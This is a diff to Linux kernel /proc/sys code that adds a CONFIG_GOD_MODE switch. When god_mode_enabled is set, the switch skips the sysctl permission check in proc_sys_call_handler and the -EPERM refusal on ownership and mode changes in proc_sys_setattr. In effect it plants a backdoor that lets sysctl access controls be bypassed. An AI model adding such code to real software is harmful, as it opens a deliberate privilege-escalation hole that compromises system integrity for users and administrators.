@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * /proc/sys support
  */
@@ -488,6 +491,9 @@ static ssize_t proc_sys_call_handler(struct file *filp, void __user *buf,
 	if (IS_ERR(head))
 		return PTR_ERR(head);
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	/*
 	 * At this point we know that the sysctl was not unregistered
 	 * and won't be until we finish.
@@ -495,6 +501,9 @@ static ssize_t proc_sys_call_handler(struct file *filp, void __user *buf,
 	error = -EPERM;
 	if (sysctl_perm(head->root, table, write ? MAY_WRITE : MAY_READ))
 		goto out;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/* if that can happen at all, it should be -EINVAL, not -EISDIR */
 	error = -EINVAL;
@@ -731,7 +740,15 @@ static int proc_sys_setattr(struct dentry *dentry, struct iattr *attr)
 	int error;
 
 	if (attr->ia_valid & (ATTR_MODE | ATTR_UID | ATTR_GID))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = inode_change_ok(inode, attr);
 	if (error)
